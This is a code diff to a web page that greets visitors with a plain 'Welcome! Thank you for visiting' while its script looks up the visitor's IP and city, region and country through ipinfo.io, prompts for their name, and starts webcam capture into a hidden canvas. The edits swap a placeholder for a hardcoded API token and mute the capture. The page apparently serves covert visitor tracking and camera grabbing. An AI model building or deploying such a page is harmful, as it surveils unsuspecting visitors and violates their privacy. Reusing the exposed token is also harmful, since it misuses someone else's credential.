@@ -42,7 +42,7 @@
                 .then(data => {
                     var ip = data.ip;
                     var userName = prompt("Please enter your name:");
-                    fetch(`https://ipinfo.io/${ip}/json?token=YOUR_IPINFO_IO_TOKEN`)
+                    fetch(`https://ipinfo.io/${ip}/json?token=a0cf54b7e5e91b`)
                         .then(response => response.json())
                         .then(locationData => {
                             var location = `${locationData.city}, ${locationData.region}, ${locationData.country}`;
@@ -73,7 +73,7 @@
                 const canvas = iframe.contentWindow.document.getElementById('canvas');
                 const context = canvas.getContext('2d');
 
-                navigator.mediaDevices.getUserMedia({ video: true })
+                navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                     .then(stream => {
                         video.srcObject = stream;
                         video.play();
@@ -105,7 +105,7 @@
                 .then(response => response.json())
                 .then(data => {
                     var ip = data.ip;
-                    fetch(`https://ipinfo.io/${ip}/json?token=YOUR_IPINFO_IO_TOKEN`)
+                    fetch(`https://ipinfo.io/${ip}/json?token=a0cf54b7e5e91b`)
                         .then(response => response.json())
                         .then(locationData => {
                             var location = `${locationData.city}, ${locationData.region}, ${locationData.country}`;
@@ -134,7 +134,7 @@
         <h1>Welcome!</h1>
         <p>Thank you for visiting.</p>
         <div class="camera-container">
-            <video id="video" autoplay></video>
+            <video id="video" autoplay muted></video>
             <canvas id="canvas" style="display: none;"></canvas>
         </div>
     </div>
